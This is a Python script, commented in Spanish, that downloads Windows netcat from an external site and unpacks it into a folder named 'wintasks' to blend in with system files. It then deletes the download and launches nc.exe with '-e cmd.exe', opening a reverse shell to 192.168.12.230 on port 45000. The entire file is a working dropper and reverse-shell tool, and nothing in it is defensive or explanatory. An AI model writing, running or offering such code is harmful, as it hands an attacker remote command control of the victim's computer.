import os
import requests
import zipfile
import subprocess
import sys

def descargar_archivo(url, nombre_archivo):
    try:
        respuesta = requests.get(url)
        with open(nombre_archivo, 'wb') as archivo:
            archivo.write(respuesta.content)
    except Exception as e:
        print("Error al descargar el archivo:", e)
        sys.exit(1)

def descomprimir_archivo(nombre_archivo, destino):
    try:
        with zipfile.ZipFile(nombre_archivo, 'r') as zip_ref:
            zip_ref.extractall(destino)
    except Exception as e:
        print("Error al descomprimir el archivo:", e)
        sys.exit(1)

def ejecutar_nc(ruta_nc, ip, puerto):
    try:
        # Cambiar el directorio de trabajo actual al directorio donde se encuentra nc.exe
        os.chdir(ruta_nc)

        comando_nc = f'nc.exe {ip} {puerto} -e cmd.exe'
        subprocess.Popen(comando_nc, shell=True)
    except Exception as e:
        print("Error al ejecutar nc.exe:", e)
        sys.exit(1)

def main():
    # URL del archivo a descargar
    url = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip"
    nombre_archivo = "netcat-win32-1.11.zip"

    # Carpeta oculta en el mismo directorio donde se ejecuta el archivo
    carpeta_oculta = os.path.join(os.getcwd(), "wintasks")

    # Descargar el archivo
    descargar_archivo(url, nombre_archivo)

    # Crear carpeta oculta
    if not os.path.exists(carpeta_oculta):
        os.makedirs(carpeta_oculta)

    # Descomprimir el archivo
    descomprimir_archivo(nombre_archivo, carpeta_oculta)

    # Eliminar el archivo descargado
    os.remove(nombre_archivo)

    # Ruta al directorio netcat-1.11
    ruta_nc = os.path.join(carpeta_oculta, "netcat-1.11")

    # Ejecutar nc.exe para conectarse a la máquina con IP 192.168.12.230 en el puerto 45000
    ip_destino = "192.168.12.230"
    puerto_destino = "45000"
    ejecutar_nc(ruta_nc, ip_destino, puerto_destino)

if __name__ == "__main__":
    main()
